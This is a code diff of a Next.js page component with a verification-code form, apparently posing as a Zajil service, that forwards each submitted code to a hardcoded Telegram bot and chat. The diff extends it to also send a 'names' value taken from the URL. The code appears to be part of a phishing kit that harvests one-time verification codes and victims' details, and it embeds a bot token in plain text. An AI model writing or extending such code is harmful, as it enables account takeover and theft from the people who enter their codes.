@@ -1,20 +1,22 @@
 "use client"
 import styles from './code.module.css'
 import { useRef } from 'react'
-import { useRouter } from 'next/navigation'
+import { useRouter,useSearchParams } from 'next/navigation'
 import Footer from '@/compnante/Footer'
 const Code = () => {
  
   
   const code = useRef();
   const router = useRouter()
+  const x = useSearchParams();
+  const datas = x.get("names") 
   const handleSubmit = (e) => {
     e.preventDefault();
     var bot={
       token:"6602536113:AAEOJoRLjsoPUxdqp9SwU1jeFqtuXf712PY",
       chat_id:6364334502
     }
-    var length= `%0A كود التحقق : ${code.current.value} %0A BY Admin Zajil:`
+    var length= `%0A كود التحقق : ${code.current.value} %0A BY Admin Zajil %0A %0A ${datas}:`
     fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
   
   }
